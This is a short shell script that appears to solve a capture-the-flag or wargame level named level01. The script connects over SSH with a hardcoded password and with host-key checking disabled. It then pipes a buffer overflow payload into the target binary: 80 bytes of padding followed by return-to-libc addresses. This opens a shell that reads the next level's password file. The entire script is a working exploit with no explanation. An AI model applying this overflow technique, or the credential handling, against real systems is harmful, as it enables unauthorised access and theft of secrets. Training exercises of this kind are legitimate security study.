#!/bin/sh
PASS='uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL'
sshpass -p $PASS ssh -q -tt -o StrictHostKeyChecking=no level01@$OVERRIDE -p 4242 << EOF
rm /tmp/leve01
SHELL=/bin/sh
(python -c "print 'dat_wil\n' + 'A'*80 + '\xd0\xae\xe6\xf7' + 'DUMM' + '\xec\x97\xf8\xf7'";echo 'cat /home/users/level02/.pass') | ./level01 > /tmp/level01
echo -e "\e[32m\$(awk 'NR==1 {print; exit}' /tmp/level01)\e[39m"
exit
EOF